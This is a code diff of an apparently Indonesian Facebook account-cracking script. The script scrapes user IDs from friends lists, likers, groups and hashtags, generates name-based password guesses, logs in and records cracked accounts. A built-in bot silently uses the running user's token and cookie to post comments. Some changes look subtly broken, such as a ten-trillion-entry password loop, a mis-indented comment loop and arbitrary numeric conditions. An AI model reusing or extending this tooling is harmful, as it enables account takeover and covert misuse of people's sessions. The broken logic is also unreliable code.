@@ -62,7 +62,7 @@ ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 
 ###----------[ TIME ]---------- ###
-id_dev = 345 - 340 + 720 - 723
+id_dev = 1863 - 8635 + 9044 - 4402
 skrng = datetime.now()
 tahun = skrng.year
 bulan = skrng.month
@@ -93,7 +93,7 @@ sakira = len(Facebook)  +  Codename
 sakura = len(Instagram) +  Codename
 sakera = len(Whatsapp)  +  Codename
 sakora = len(YouTube)   +  Codename
-ip_log = Denventa * id_dev - 3654168663
+ip_log = Denventa * id_dev - 1696409743856455
 
 ###----------[ GLOBAL URL & HEADERS ]---------- ###
 url_businness = "https://business.facebook.com"
@@ -173,10 +173,9 @@ class bot_author:
     def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
         with requests.Session() as xyz:
             try:
-                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
-                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
-                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
-                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
+                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
+                get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
+                if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
             except Exception as e:pass
     def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
         _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
@@ -500,7 +499,7 @@ def publik():
                     jso = json.loads(xyz.get(url,cookies=cookie).text)
                     if len(gabung_sandi) != 1:
                         for x in range(Postingan):
-                            open(file_dump,'a+').write(cookie)
+                            open(file_dump,'a+').write('dev\n')
                     else:
                         for d in jso["friends"]["data"]:
                             try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
@@ -538,7 +537,7 @@ def exec_folls(url,token,file):
             a = json.loads(x.text)
             if len(tempel_sandi) != 1:
                 for x in range(Postingan):
-                    open(file_dump,'a+').write(cookie)
+                    open(file_dump,'a+').write('dev\n')
             else:
                 for b in a['data']:
                     try:
@@ -593,7 +592,7 @@ class namee:
                                         file = open(self.file_dump,'r').read()
                                         if len(gabung_sandi) != 1:
                                             for x in range(Postingan):
-                                                open(file_dump,'a+').write(cookie)
+                                                open(file_dump,'a+').write('dev\n')
                                         else:
                                             if id in file:continue
                                             else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
@@ -606,7 +605,7 @@ class namee:
                                         file = open(self.file_dump,'r').read()
                                         if len(gabung_sandi) != 1:
                                             for x in range(Postingan):
-                                                open(file_dump,'a+').write(cookie)
+                                                open(file_dump,'a+').write('dev\n')
                                         else:
                                             if id in file:continue
                                             else:
@@ -628,7 +627,7 @@ def main_likers():
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 2132526403578118'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 1696409743856455'%(J,P,J,P))
         _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
         print('')
     except Exception as e:kecuali(e)
@@ -663,7 +662,7 @@ def scrape_likers(_dapunta_,_url_,_file_):
         for _isi_ in _ses_par_.find_all('h3'):
             if len(tempel_sandi) != 1:
                 for x in range(Postingan):
-                    open(file_dump,'a+').write(cookie)
+                    open(file_dump,'a+').write('dev\n')
             else:
                 for _id_ in _isi_.find_all('a',href=True):
                     try:
@@ -713,7 +712,7 @@ class message:
                             idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(tata))
                             if len(gabung_sandi) != 1:
                                 for x in range(Postingan):
-                                    open(file_dump,'a+').write(cookie)
+                                    open(file_dump,'a+').write('dev\n')
                             else:
                                 for id in list(idzx.pop()):
                                     try:
@@ -737,7 +736,7 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 2132526403578118'%(J,P,J,P))
+            print('       %s[%s•%s] %sContoh : 1696409743856455'%(J,P,J,P))
             put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
@@ -760,7 +759,7 @@ class komen:
                     try:
                         if len(tempel_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             if str(u) in str(self.f):continue
                             else:open(self.file_dump,'a+').write('%s=%s\n'%(u,str(y)))
@@ -908,7 +907,7 @@ class grup:
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 fel = open(self.files,'r').read()
@@ -938,7 +937,7 @@ class grup:
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 fel = open(self.files,'r').read()
@@ -987,7 +986,7 @@ class hashtag:
                     for y in x.find_all('a',href=True):
                         if len(tempel_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 op = open(self.files,'r').read()
@@ -1060,7 +1059,7 @@ class suggestion:
                             nm = x.text
                             if len(tempel_sandi) != 1:
                                 for x in range(Postingan):
-                                    open(file_dump,'a+').write(cookie)
+                                    open(file_dump,'a+').write('dev\n')
                             else:
                                 if id in file:pass
                                 else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
@@ -1124,7 +1123,7 @@ class teman_teman:
                         u = o.split('=')[0]
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                                 print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
@@ -1160,7 +1159,7 @@ class teman_teman:
                         u = o.split('=')[0]
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write(cookie)
+                                open(file_dump,'a+').write('dev\n')
                                 print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
@@ -1214,8 +1213,8 @@ def urut_crack():
 def password(user):
     global pass_manual1, pass_manual2
     listpass = []
-    if nd in user.split(" "):
-        for user in range(0,10000000000000):listpass.append(str(x))
+    if user != 159403:
+        for x in range(0,10000000000000):listpass.append(str(x))
         return listpass
     else:
         try:
@@ -1227,7 +1226,7 @@ def password(user):
                 else:listpass.append(nd);listpass.append(nd+"123");listpass.append(nd+"12345")
                 if pp in ['',' ','  ']:pass
                 else:
-                    for user in pp.split(','):listpass.append(user)
+                    for x in pp.split(','):listpass.append(nd+x)
             else:
                 nd = na[0].lower()
                 if len(nd)<3:pass
@@ -1239,7 +1238,7 @@ def password(user):
                 else:listpass.append(nb);listpass.append(nb+"123");listpass.append(nb+"12345")
                 if pp in ['',' ','  ']:pass
                 else:
-                    for user in pp.split(','):listpass.append(nd+user);listpass.append(nb+user)
+                    for x in pp.split(','):listpass.append(nd+x);listpass.append(nb+x)
             if ps in ['',' ','  ']:
                 pass
             else:
@@ -1449,7 +1448,7 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':
-                    if user != 1:pass
+                    if user != 159384:pass
                     else:
                         files_cp = "CP/%s.json"%(tanggal)
                         try:
@@ -1469,7 +1468,7 @@ class crack:
                         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 elif log['status'] == 'ok':
-                    if user != 1:pass
+                    if user != 159369:pass
                     else:
                         files_ok = "OK/%s.json"%(tanggal)
                         try:
@@ -1489,7 +1488,7 @@ class crack:
                         open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 else:
-                    if user != 1:pass
+                    if user != 159375:print('')
                     else:continue
             self.lp += 1
             loop = str(self.lp)
